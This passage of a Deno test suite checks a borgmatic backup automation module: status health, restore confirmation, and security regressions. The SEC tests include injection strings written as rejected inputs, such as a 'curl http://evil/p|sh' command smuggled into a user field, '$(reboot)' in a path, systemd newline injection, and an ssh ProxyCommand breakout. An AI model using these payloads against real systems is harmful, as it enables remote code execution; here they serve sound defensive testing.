    "SWAMP_BORG_ST_TIMER_ENABLED=enabled",
    "SWAMP_BORG_ST_NEXT=123",
    `SWAMP_BORG_ST_LAST_B64=${b64}`,
  ].join("\n") + "\n";
  const { run } = scriptedRunner([{ match: "is-active", result: { stdout } }]);
  await callExec(model.methods.status.execute, { _run: run }, context);
  const st = writes.find((w) => w.spec === "status");
  assertEquals(st?.data.healthy, true);
  assertEquals(st?.data.timerActive, true);
  assertEquals((st?.data.reasons as string[]).length, 0);
});

Deno.test("status: unhealthy with a stale archive", async () => {
  const { context, writes } = fakeContext(baseCfg);
  // baseCfg has keepDaily=7 → maxAgeHours = 7*24+2 = 170h; 200h is stale.
  const stale = new Date(Date.now() - 200 * 3_600_000).toISOString();
  const lastJson = JSON.stringify([{ archives: [{ name: "a", time: stale }] }]);
  const stdout = [
    "SWAMP_BORG_ST_CONFIG_PRESENT=1",
    "SWAMP_BORG_ST_VALIDATE=0",
    "SWAMP_BORG_ST_TIMER_ACTIVE=active",
    "SWAMP_BORG_ST_TIMER_ENABLED=enabled",
    `SWAMP_BORG_ST_LAST_B64=${strToBase64(lastJson)}`,
  ].join("\n") + "\n";
  const { run } = scriptedRunner([{ match: "is-active", result: { stdout } }]);
  await callExec(model.methods.status.execute, { _run: run }, context);
  const st = writes.find((w) => w.spec === "status");
  assertEquals(st?.data.healthy, false);
  assertMatch((st?.data.reasons as string[]).join(","), /old/);
});

Deno.test("restore: refuses non-dry-run without confirm", async () => {
  const { context } = fakeContext(baseCfg);
  const { run } = scriptedRunner([{
    match: "extract",
    result: { stdout: "" },
  }]);
  await assertRejects(
    () =>
      callExec(model.methods.restore.execute, {
        archive: "latest",
        dryRun: false,
        confirm: false,
        _run: run,
      }, context),
    Error,
    "confirm:true",
  );
});

Deno.test("restore: dry-run allowed without confirm", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const { run, calls } = scriptedRunner([{
    match: "extract",
    result: { stdout: "would extract\n" },
  }]);
  await callExec(model.methods.restore.execute, {
    archive: "latest",
    dryRun: true,
    confirm: false,
    _run: run,
  }, context);
  assertEquals(writes.find((w) => w.spec === "op")?.data.op, "restore");
  assertMatch(calls[0], /--dry-run/);
});

Deno.test("model shape: type, verbs, reachable check coverage", () => {
  assertEquals(model.type, "@shrug/borgmatic");
  for (
    const v of [
      "configure",
      "initRepo",
      "backup",
      "prune",
      "compact",
      "check",
      "listArchives",
      "info",
      "status",
      "restore",
    ]
  ) {
    // deno-lint-ignore no-explicit-any
    assertEquals(typeof (model.methods as any)[v]?.execute, "function");
  }
  assertEquals(
    model.checks.reachable.appliesTo.includes("backup"),
    true,
  );
});

// --- security regression tests (adversarial review 2026-08-07) --------------

Deno.test("SEC-1: schema rejects injection in ssh/sudo/systemd/path fields", () => {
  // becomeUser / sshUser are spliced into ssh trailing args → remote shell.
  assertThrows(() =>
    GARGS.parse({ host: "h", becomeUser: "x; curl http://evil/p|sh #" })
  );
  assertThrows(() => GARGS.parse({ host: "h", sshUser: "root; reboot" }));
  // onCalendar / randomizedDelay land in a systemd drop-in (newline injection).
  assertThrows(() =>
    GARGS.parse({
      host: "h",
      schedule: { onCalendar: "daily\n[Timer]\nUnit=x" },
    })
  );
  assertThrows(() =>
    GARGS.parse({
      host: "h",
      schedule: { randomizedDelay: "3h\nPersistent=x" },
    })
  );
  // configDir with shell metacharacters.
  assertThrows(() => GARGS.parse({ host: "h", configDir: "/etc/$(reboot)" }));
});

Deno.test("SEC-1: schema accepts legitimate values", () => {
  const ok = GARGS.parse({
    host: "192.0.2.20",
    sshUser: "deploy",
    become: true,
    becomeUser: "backup-svc",
    configDir: "/etc/borgmatic",
    schedule: {
      onCalendar: "*-*-* 02:00:00",
      randomizedDelay: "3h",
      persistent: true,
    },
  }) as GlobalArgs;
  assertEquals(ok.becomeUser, "backup-svc");
  assertEquals(ok.sshUser, "deploy");
});

Deno.test("SEC-2: crafted sshKeyPath cannot inject ssh_command options", () => {
  // Attempt to break out of `ssh -i '<path>'` into an extra -o ProxyCommand.
  const evil = "id_rsa' -o ProxyCommand='touch /tmp/pwned";
  const out = renderBorgmaticConfig({ ...baseCfg, sshKeyPath: evil }, V19);
  const line = out.split("\n").find((l) => l.startsWith("ssh_command:"))!;
  // The embedded ' is shQuote-escaped (yamlDq then doubles the backslash), so
  // borg's shlex.split sees the whole payload as ONE inert -i value.
  assertMatch(line, /-i 'id_rsa'\\\\'' -o ProxyCommand=/); // escaped, quoted
  // The vulnerable raw-interpolation render would instead close the quote and
  // expose a bare ` -o ProxyCommand` option — assert that never happens.
  assertNotMatch(line, /-i 'id_rsa' -o ProxyCommand/);
});

Deno.test("SEC-3: DB hook password is redacted from the persisted config", () => {
  const cfg: GlobalArgs = {
    ...baseCfg,
    hooks: {
      databases: [
        {
          type: "postgresql",
          name: "app",
          username: "app",
          password: "S3cretDbPw!",
        },
      ],
    },
  };
  const red = redactConfig(renderBorgmaticConfig(cfg, V20));
  assertNotMatch(red, /S3cretDbPw!/);
  assertMatch(red, /password: "<redacted>"/);
});

Deno.test("SEC-4: redactPassphraseLeaks handles escaped quotes with no tail leak", () => {
  // yamlDq renders a passphrase containing " as \" — a quote-delimited regex
  // would stop at the fake boundary and leak the tail.
  const leaked = 'encryption_passphrase: "ab\\"cd-SECRETTAIL"';
  const red = redactPassphraseLeaks(leaked);
  assertNotMatch(red, /SECRETTAIL/);
  assertMatch(red, /encryption_passphrase: <redacted>/);
});

// --- sshExec error-path: no leaked subprocess on a broken STDIN pipe ---------
//
// Regression for the resource leak fixed in 2026.11.19.2: if the piped STDIN
// write rejects (host refuses, broken pipe) before child.output() is awaited,
// sshExec must kill AND reap the ssh child instead of orphaning it. We stub
// Deno.Command with a fake whose stdin writer rejects, then assert the child
// was killed (SIGKILL) and reaped (status awaited) and that output() -- the
// stream-draining collect -- was never reached.
Deno.test("sshExec: stdin write rejection kills+reaps the ssh child", async () => {
  const origCommand = Deno.Command;
  let killed: string | undefined;
  let statusAwaited = false;
  let outputCalled = false;

  class FakeCommand {
    constructor(_cmd: string | URL, _opts: unknown) {}
    spawn() {
      return {
        stdin: {
          getWriter() {
            return {
              write(_chunk: Uint8Array) {
                return Promise.reject(
                  new Error("broken pipe: host refused STDIN"),
                );
              },
              close() {
                return Promise.resolve();
              },
              releaseLock() {},
            };
          },
        },
        kill(sig: string) {
          killed = sig;
        },
        get status() {
          statusAwaited = true;
          return Promise.resolve({ success: false, code: 137, signal: null });
        },
        output() {
          outputCalled = true;
          return Promise.resolve({
            code: 0,
            stdout: new Uint8Array(),
            stderr: new Uint8Array(),
          });
        },
      };
    }
  }

  // deno-lint-ignore no-explicit-any
  (Deno as any).Command = FakeCommand;
  try {
    await assertRejects(
      () => sshExec(baseCfg, "echo hi\n"),
      Error,
      "broken pipe",
    );
  } finally {
    // deno-lint-ignore no-explicit-any
    (Deno as any).Command = origCommand;
  }

  assertEquals(killed, "SIGKILL"); // child was killed on the error path
  assertEquals(statusAwaited, true); // child was reaped (status awaited)
  assertEquals(outputCalled, false); // output() never reached: no dangling collect
});
